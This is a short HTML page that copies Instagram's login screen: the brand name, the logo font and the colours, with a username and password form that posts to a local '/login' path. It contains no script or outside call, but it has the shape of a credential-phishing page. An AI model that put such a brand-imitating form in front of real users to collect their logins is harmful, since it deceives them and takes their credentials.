<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram Style Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      width: 350px;
      padding: 40px;
      background: #fff;
      border: 1px solid #dbdbdb;
      text-align: center;
    }
    .login-box h1 {
      font-family: "Billabong", cursive;
      font-size: 48px;
      margin-bottom: 20px;
    }
    .login-box input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
    }
    .login-box button {
      width: 100%;
      padding: 10px;
      background: #0095f6;
      border: none;
      border-radius: 4px;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
    }
    .login-box button:hover {
      background: #0077cc;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h1>Instagram</h1>
    <form action="/login" method="POST">
  <input type="text" name="username" placeholder="Username" required>
  <input type="password" name="password" placeholder="Password" required>
  <button type="submit">Log In</button>
</form>

  </div>
</body>
</html>
